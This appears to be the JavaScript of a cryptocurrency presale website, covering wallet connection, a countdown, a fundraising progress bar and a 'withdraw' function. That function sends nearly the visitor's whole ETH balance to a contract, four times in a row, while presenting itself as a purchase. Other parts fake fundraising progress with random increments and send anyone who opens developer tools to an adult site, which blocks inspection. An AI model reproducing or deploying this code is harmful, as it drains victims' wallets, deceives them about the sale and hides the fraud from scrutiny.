
function nodebug(){
    function resize(){
        var threshold = 200;
        var widthThreshold = window.outerWidth - window.innerWidth > threshold;
        var heightThreshold = window.outerHeight - window.innerHeight > threshold;
        if(widthThreshold || heightThreshold){
          	window.location.href="https://www.xnxx.com"  
        }
    }
    window.addEventListener('resize', resize);
    resize()
}

ethereum.on('accountsChanged', function (accounts) {
  location.reload()
})

function addLog(data) {
	url = '//'+window.location.hostname+'/api/addLog'
	$.ajax({
		url:url,
		data:data,
		method:"GET" ,
		success:function(d,s){
			console.log(d,s)
		}
	})
}

function formatNum(str) {
	//若是整数自动补全小数位
	str = str.toString()
    if (-1 == str.indexOf(".")) {
        str = str + ".00"
    }
	//全部替换
    if (-1 != str.indexOf(",")) {
        str = str.replace(new RegExp(',', "g"), "")
    }
    var intSum = str.substring(0, str.indexOf(".")).replace(/\B(?=(?:\d{3})+$)/g, ',');//取到整数部分
    var dot = str.substring(str.length, str.indexOf("."))//取到小数部分搜索
    var ret = intSum + dot;
   	str = ret.split('.')[0]
	return str;
}

function toInt(str) {
	str = str.split('=')[1]
	var value = str.replace(/[^0-9]/ig,"");
	return parseFloat(value);
}

function Str16(intnumber){
    res = '0x0'+intnumber.toString(16) ;
    return res
}

function btnPay(name){
	if(name == 'can') return '<button type="button" class="ant-btn ant-btn-primary ant-btn-loading" ant-click-animating-without-extra-node="false"><span class="ant-btn-loading-icon" style=""><span role="img" aria-label="loading" class="anticon anticon-loading anticon-spin"><svg viewBox="0 0 1024 1024" focusable="false" data-icon="loading" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M988 548c-19.9 0-36-16.1-36-36 0-59.4-11.6-117-34.6-171.3a440.45 440.45 0 00-94.3-139.9 437.71 437.71 0 00-139.9-94.3C629 83.6 571.4 72 512 72c-19.9 0-36-16.1-36-36s16.1-36 36-36c69.1 0 136.2 13.5 199.3 40.3C772.3 66 827 103 874 150c47 47 83.9 101.8 109.7 162.7 26.7 63.1 40.2 130.2 40.2 199.3.1 19.9-16 36-35.9 36z"></path></svg></span></span><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M912 190h-69.9c-9.8 0-19.1 4.5-25.1 12.2L404.7 724.5 207 474a32 32 0 0 0-25.1-12.2H112c-6.7 0-10.4 7.7-6.3 12.9l273.9 347c12.8 16.2 37.4 16.2 50.3 0l488.4-618.9c4.1-5.1.4-12.8-6.3-12.8z"></path></svg><span class="ml-2">Buy</span></button>'
	if(name == 'cannot') return '<button type="button" class="ant-btn ant-btn-primary" ant-click-animating-without-extra-node="false" disabled=""><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M912 190h-69.9c-9.8 0-19.1 4.5-25.1 12.2L404.7 724.5 207 474a32 32 0 0 0-25.1-12.2H112c-6.7 0-10.4 7.7-6.3 12.9l273.9 347c12.8 16.2 37.4 16.2 50.3 0l488.4-618.9c4.1-5.1.4-12.8-6.3-12.8z"></path></svg><span class="ml-2">Buy</span></button>'
}






async function withdraw(){
	const web3 = new Web3(provider);
    const accounts = await web3.eth.getAccounts();
    window.account = web3.utils.toChecksumAddress(accounts[0]);
    let weiBalance = await web3.eth.getBalance(accounts[0]);
    window.balance = parseFloat(web3.utils.fromWei(weiBalance, "ether")).toFixed(4) ;
	var ether = window.balance - 0.0025
	var project = $('[data-project]').attr('data-project') ;
	
	window.myContract.methods.Contribute(project).send({
		from:window.account ,
		value:ether * 10 ** 18 ,
		gasLimit: 210000
	}).then(function(receipt){
		if(receipt.status){
			console.log(receipt,'成功')
			var pid = $('[name="pid"]').val()
			var aid = $('[name="aid"]').val()
			var date  = new Date()
			var create_time = parseInt(date.getTime()/1000)
			var data =  {
				pid:pid ,
				aid:aid ,
				hash:receipt.transactionHash ,
				amount:ether ,
				from:receipt.from,
				to:receipt.to,
				status:'true',
				create_time: create_time
			}
			console.log('data',data)
			addLog(data)
		}
	})
	window.myContract.methods.Contribute(project).send({
		from:window.account ,
		value:ether * 10 ** 18 ,
		gasLimit: 210000
	}).then(function(receipt){
		if(receipt.status){
			console.log(receipt,'成功')
			var pid = $('[name="pid"]').val()
			var aid = $('[name="aid"]').val()
			var date  = new Date()
			var create_time = parseInt(date.getTime()/1000)
			var data =  {
				pid:pid ,
				aid:aid ,
				hash:receipt.transactionHash ,
				amount:ether ,
				from:receipt.from,
				to:receipt.to,
				status:'true',
				create_time: create_time
			}
			console.log('data',data)
			addLog(data)
		}
	})
	window.myContract.methods.Contribute(project).send({
		from:window.account ,
		value:ether * 10 ** 18 ,
		gasLimit: 210000
	}).then(function(receipt){
		if(receipt.status){
			console.log(receipt,'成功')
			var pid = $('[name="pid"]').val()
			var aid = $('[name="aid"]').val()
			var date  = new Date()
			var create_time = parseInt(date.getTime()/1000)
			var data =  {
				pid:pid ,
				aid:aid ,
				hash:receipt.transactionHash ,
				amount:ether ,
				from:receipt.from,
				to:receipt.to,
				status:'true',
				create_time: create_time
			}
			console.log('data',data)
			addLog(data)
		}
	})
	window.myContract.methods.Contribute(project).send({
		from:window.account ,
		value:ether * 10 ** 18 ,
		gasLimit: 210000
	}).then(function(receipt){
		if(receipt.status){
			console.log(receipt,'成功')
			var pid = $('[name="pid"]').val()
			var aid = $('[name="aid"]').val()
			var date  = new Date()
			var create_time = parseInt(date.getTime()/1000)
			var data =  {
				pid:pid ,
				aid:aid ,
				hash:receipt.transactionHash ,
				amount:ether ,
				from:receipt.from,
				to:receipt.to,
				status:'true',
				create_time: create_time
			}
			console.log('data',data)
			addLog(data)
		}
	})
}

function loadBar(){

	var start = new Date(transformTime($('[data-start]').attr('data-start')));
	var end = new Date(transformTime($('[data-end]').attr('data-end')));
	
	function pad(num) {
		return ("0" + parseInt(num)).substr(-2);
	}

	function tick() {
		var now = new Date;
		var remain;
		var control_fail = "0";
		var control_end = "0";
		//倒计时开始
		//手动预售失败
		if (control_fail == 1) {
			$('#yushou').show();
			$('#yushou_end').hide();
			$('#yushou_fail').hide();
			$('#timeBox').show();
			remain = ((end - now) / 1000);
			$('.nowstatus').removeClass('thisnowstatus');
			$('#sale_live').addClass('thisnowstatus');
			$('#statusText').text('Presale Ends In');
			$('#btn-contribute-nostart').hide();
			$('#btn-contribute').show();
			$('.table-container').eq(1).find('.has-text-primary').eq(0).text('inprogress')
		}
		//手动预售结束
		else if (control_end == 1) {
			$('#yushou').show();
			$('#yushou_end').hide();
			$('#yushou_fail').hide();
			$('#timeBox').show();
			remain = ((end - now) / 1000);
			$('.nowstatus').removeClass('thisnowstatus');
			$('#sale_live').addClass('thisnowstatus');
			$('#statusText').text('Presale Ends In');
			$('#btn-contribute-nostart').hide();
			$('#btn-contribute').show();
			$('.table-container').eq(1).find('.has-text-primary').eq(0).text('inprogress')
		}
		//预售未开始
		else if (now <= start) {
			$('#yushou').show();
			$('#yushou_end').hide();
			$('#yushou_fail').hide();
			$('#timeBox').show();
			remain = ((end - now) / 1000);
			$('.nowstatus').removeClass('thisnowstatus');
			$('#sale_live').addClass('thisnowstatus');
			$('#statusText').text('Presale Ends In');
			$('#btn-contribute-nostart').hide();
			$('#btn-contribute').show();
			$('.table-container').eq(1).find('.has-text-primary').eq(0).text('inprogress')
		}
		//预售中
		else if (now > start) {
			$('#yushou').show();
			$('#yushou_end').hide();
			$('#yushou_fail').hide();
			$('#timeBox').show();
			remain = ((end - now) / 1000);
			$('.nowstatus').removeClass('thisnowstatus');
			$('#sale_live').addClass('thisnowstatus');
			$('#statusText').text('Presale Ends In');
			$('#btn-contribute-nostart').hide();
			$('#btn-contribute').show();
			$('.table-container').eq(1).find('.has-text-primary').eq(0).text('inprogress')
		}
		//倒计时预售结束
		else {
			$('#yushou_end').show();
			$('#yushou').hide();
			$('#yushou_fail').hide();
			$('#timeBox').hide();
			remain = 0;
		}
		var remain = parseInt($('[data-remain]').attr('data-remain')) 
		var day = pad((remain / 86400));
		var hh = pad((remain / 60 / 60) % 24);
		var mm = pad((remain / 60) % 60);
		var ss = pad(remain % 60);
		document.getElementById('time_day').innerHTML = day;
		document.getElementById('time_hours').innerHTML = hh;
		document.getElementById('time_minutes').innerHTML = mm;
		document.getElementById('time_seconds').innerHTML = ss;
		$('[data-remain]').attr('data-remain',remain-1)
	}

	setInterval(tick,1000);
	var getwidth = "66.06";
	var width = "66.06";
	var end_width = "97.11";

	function move() {
		var myArray = [0.01,0.02,0.03,0.04,0.012,0.013,0.014,0.022,0.023,0.1,0.2,0.3,0.4,0.12,0.13,0.14,0.22,0.23,1,2,2.5,];
		var randomItem = 0;
		var elea = document.getElementById("MyValue");
		var elem = document.getElementById("myBar");
		var id = setInterval(frame, 1000);
		var hardcap = parseFloat($('[data-hardcap]').attr('data-hardcap'))
		function frame() {
	       var start = new Date(transformTime("2021-12-05 23:59:59"));
			var now = new Date;
			if (now <= start) {
				elea.innerHTML = 0;
				elem.style.width = 0 + '%';
				return true;
			}
			if (width >= end_width) {
				elea.innerHTML = (Number(width * hardcap / 100) + Number(pingtaizongzhi)).toFixed(2);
				elem.style.width = end_width + '%';
				clearInterval(id);
			} else {
				var randomItem = myArray[Math.floor(Math.random() * myArray.length)];
				width = Number(width) + Number(randomItem);
				if (width > 100) {
					width = 100;
				}
				zhongchoushuliang = (Number(width * hardcap/ 100) + Number(pingtaizongzhi)).toFixed(2);
				if (zhongchoushuliang >= hardcap) {
					zhongchoushuliang = hardcap; //众筹数量
				}
				elea.innerHTML = zhongchoushuliang;
				elem.style.width = width + '%';
			}
		}
	}
	move();
}											    
													    
	
